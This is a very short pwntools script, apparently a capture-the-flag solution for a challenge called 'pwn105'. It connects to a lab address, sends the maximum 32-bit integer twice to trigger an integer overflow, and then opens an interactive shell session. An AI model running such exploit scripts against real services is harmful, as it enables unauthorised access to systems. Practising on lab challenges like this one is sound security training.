
from pwn import *

context.log_level = "debug"


p = process('./pwn105-1644300421555.pwn105')
p = remote('10.10.141.199', 9005)
p.sendline(b'2147483647')
p.sendline(b'2147483647')
p.interactive()
